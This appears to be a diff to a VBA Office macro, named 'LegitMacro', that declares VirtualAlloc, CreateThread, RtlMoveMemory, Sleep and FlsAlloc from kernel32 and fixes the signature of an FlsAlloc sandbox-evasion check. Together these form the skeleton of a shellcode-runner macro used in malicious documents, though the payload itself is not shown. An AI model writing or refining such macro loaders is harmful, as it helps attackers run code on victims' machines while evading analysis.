@@ -2,7 +2,7 @@ Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Lo
 Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
 Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
-Private Declare PtrSafe Function FlsAlloc Lib "kernel32" () As LongPtr
+Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
 Sub LegitMacro()
     Dim allocRes As LongPtr
     Dim t1 As Date
@@ -15,7 +15,7 @@ Sub LegitMacro()
     Dim res As LongPtr
     
     ' Call FlsAlloc and verify if the result exists
-    allocRes = FlsAlloc()
+    allocRes = FlsAlloc(0)
     If IsNull(allocRes) Then
         End
     End If
